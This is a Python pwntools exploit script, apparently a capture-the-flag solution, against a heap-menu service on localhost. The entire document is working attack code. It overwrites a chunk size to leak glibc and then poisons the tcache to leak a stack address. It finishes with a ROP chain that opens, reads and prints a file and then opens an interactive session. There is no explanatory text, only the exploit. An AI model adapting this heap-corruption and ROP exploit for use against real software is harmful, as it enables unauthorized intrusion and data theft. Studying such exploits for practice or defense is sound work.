``` python
#!/usr/bin/python3.10
from pwn import *


host = "localhost"
port = 4241
p = remote(host, port)

def malloc(index, size):
    print("[+] malloc")
    p.send(b"1")
    p.recvuntil("index > ")
    p.sendline(str(index))
    p.recvuntil("size > ")
    p.sendline(str(size))

def free(index):
    print("[+] free")
    p.sendline(b"2")
    p.recvuntil("index > ")
    p.sendline(str(index))

def edit(index, size, payload):
    print("[+] edit")
    p.send(b"3")
    p.recvuntil("index > ")
    p.sendline(str(index))
    p.recvuntil("size > ")
    p.sendline(str(size))
    p.recvuntil("content > ")
    p.send(payload)

def view(index):
    print("[+] view")
    p.sendline(b"4")
    p.recvuntil("index > ")
    p.sendline(str(index))
    return p.recvline(timeout=5)

def view_stack(index):
    print("[+] view stack")
    p.send(b"4")
    p.recvuntil("index > ")
    p.sendline(str(index))
    return p.recvuntil(b"\x7f\x00\x00", timeout=1)

def _exit():
    print("[+] exit")
    p.sendline(b"5")


print(p.recvuntil("5. exit"))

malloc(19, 1500)
malloc(20, 10)
malloc(21, 1500)
malloc(22, 1500)
for i in range(23, 31):
    malloc(i, 100)


payload = b"\x00" * 1512 + p64(1553, endianness="little")
edit(19, len(payload), payload)
free(20)
malloc(20, 1535)
mem = view(20)
glibc_leak = int.from_bytes(mem[:8], byteorder="little")

# Calculate important addresses
libc_base = glibc_leak - 0x1ECBE0
system_addr = libc_base + 0x52290
open_addr = libc_base + 0x10DF00
read_addr = libc_base + 0x10E1E0
write_addr = libc_base + 0x10E280
where_stack_is = glibc_leak + 0x2A20

print(f"glibc leak: {hex(glibc_leak)}")
print(f"libc base: {hex(libc_base)}")
print(f"system addr: {hex(system_addr)}")

# Stack leak
free(25)
free(24)
payload = b"@" * 96 + b"\x00" * 8 + p64(113, endianness="little") + p64(where_stack_is, endianness="little")
edit(23, len(payload), payload)
malloc(24, 100)
malloc(25, 100)
stack_leak = int.from_bytes(view_stack(25), byteorder="little")
print(f"stack leak: {hex(stack_leak)}")

# ROP chain
ret_addr = stack_leak - 0x130
pop_rdi_gadget = p64(libc_base + 0x23B6A, endianness="little")
nop_gadget = p64(libc_base + 0x319BF, endianness="little")
pop_rsi_gadget = p64(libc_base + 0x2601F, endianness="little")
pop_rdx_r12_gadget = p64(libc_base + 0x119431, endianness="little")
new_stack = stack_leak - 16

payload = (
    nop_gadget +
    pop_rdi_gadget + p64(stack_leak, endianness="little") +
    pop_rsi_gadget + b"\x00" * 8 +
    p64(open_addr, endianness="little") +
    pop_rdi_gadget + p64(3, endianness="little") +
    pop_rsi_gadget + p64(stack_leak, endianness="little") +
    pop_rdx_r12_gadget + p64(100, endianness="little") + p64(100, endianness="little") +
    p64(read_addr, endianness="little") +
    pop_rdi_gadget + p64(1, endianness="little") +
    pop_rsi_gadget + p64(stack_leak, endianness="little") +
    pop_rdx_r12_gadget + p64(100, endianness="little") + p64(100, endianness="little") +
    p64(write_addr, endianness="little")
)

pause()
edit(32, len(payload), payload)
print(p.recvall(timeout=10))
p.interactive()

